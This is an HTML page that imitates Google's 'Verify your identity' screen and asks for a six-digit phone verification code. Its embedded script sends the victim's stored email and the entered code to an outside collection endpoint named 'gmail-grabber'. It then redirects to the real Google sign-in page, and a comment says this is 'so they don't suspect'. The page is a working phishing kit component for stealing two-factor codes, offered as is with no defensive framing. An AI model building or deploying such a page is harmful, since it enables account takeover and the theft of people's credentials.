<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verify your identity</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: 'Google Sans', 'Roboto', sans-serif;
      background: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }
    .login {
      width: 100%;
      max-width: 450px;
      padding: 2rem 2rem 3rem;
      border: 1px solid #dadce0;
      border-radius: 8px;
      background: #fff;
    }
    .login h1 { font-size: 1.3rem; font-weight: 400; margin-bottom: 0.5rem; }
    .login p { color: #5f6368; margin-bottom: 1.5rem; font-size: 0.9rem; }
    .login input[type="text"] {
      width: 100%;
      padding: 12px 14px;
      margin-bottom: 1rem;
      border: 1px solid #dadce0;
      border-radius: 4px;
      font-size: 1rem;
      text-align: center;
      letter-spacing: 4px;
    }
    .login input:focus { border-color: #1a73e8; outline: none; }
    .login button {
      width: 100%;
      background: #1a73e8;
      color: white;
      border: none;
      padding: 12px;
      border-radius: 4px;
      font-size: 1rem;
      font-weight: 500;
      cursor: pointer;
    }
    .login button:hover { background: #1557b0; }
    .login .footer { margin-top: 1.5rem; font-size: 0.8rem; color: #5f6368; text-align: center; }
    .error { color: #d93025; font-size: 0.85rem; margin-bottom: 0.75rem; display: none; }
  </style>
</head>
<body>
<div class="login">
  <h1>🔐 Verify your identity</h1>
  <p>Enter the verification code sent to your phone</p>
  <div id="error" class="error">⚠️ Invalid code. Try again.</div>
  <form id="codeForm">
    <input type="text" id="code" placeholder="6-digit code" maxlength="6" inputmode="numeric" required>
    <button type="submit">Verify</button>
  </form>
  <div class="footer"><a href="#">Try another method</a></div>
</div>
<script>
  const COLLECT_URL = "https://gmail-grabber.michellmiranda0707.workers.dev/collect";
  const email = sessionStorage.getItem('gmail_email') || 'unknown';

  document.getElementById('codeForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    const code = document.getElementById('code').value;
    const errorEl = document.getElementById('error');

    if (!code || code.length < 6) { errorEl.style.display = 'block'; return; }
    errorEl.style.display = 'none';

    try {
      await fetch(COLLECT_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, code, step: 2, time: Date.now() })
      });
    } catch (_) {}

    // redirect to real gmail login so they don't suspect
    window.location.href = 'https://accounts.google.com/v3/signin/identifier?continue=https://mail.google.com';
  });
</script>
</body>
</html>
